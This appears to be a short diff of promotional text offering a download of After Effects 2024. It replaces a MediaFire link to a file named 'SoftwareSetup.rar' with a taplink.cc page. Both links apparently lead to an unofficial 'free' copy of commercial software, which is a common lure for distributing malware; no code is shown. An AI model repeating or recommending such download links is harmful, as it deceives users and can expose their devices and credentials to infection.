@@ -16,4 +16,4 @@ So, if you're ready to take your visual creations to the next level, look no fur
 
 I'll include a link to download After Effects 2024 along with detailed instructions on how to get started. Join the millions of visual creators worldwide who trust After Effects 2024 to bring their creative visions to life - try it out today!
 
-|[Download]([https://www.mediafire.com/file/jtfpzagrmd1sq6a/SoftwareSetup.rar/file)
+|[Download](https://taplink.cc/ruthreeves)
